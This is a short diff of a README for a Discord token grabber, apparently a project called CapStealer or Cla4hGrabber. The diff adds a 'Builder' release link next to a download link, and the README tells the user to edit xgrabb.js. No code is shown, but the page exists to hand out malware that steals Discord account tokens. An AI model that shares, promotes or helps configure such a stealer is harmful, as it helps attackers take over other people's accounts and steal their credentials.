@@ -1,4 +1,4 @@
-## ``-`` [Download](https://github.com/infinist/CapStealer/archive/refs/heads/main.zip)
+## ``-`` [Download](https://github.com/infinist/CapStealer/archive/refs/heads/main.zip) ``-`` [Builder](https://github.com/infinist/CapStealer/releases/tag/Builder)
 ### Cla4hGrabber | Discord IMAGE Token Grabber
 
 - edit file xgrabb.js
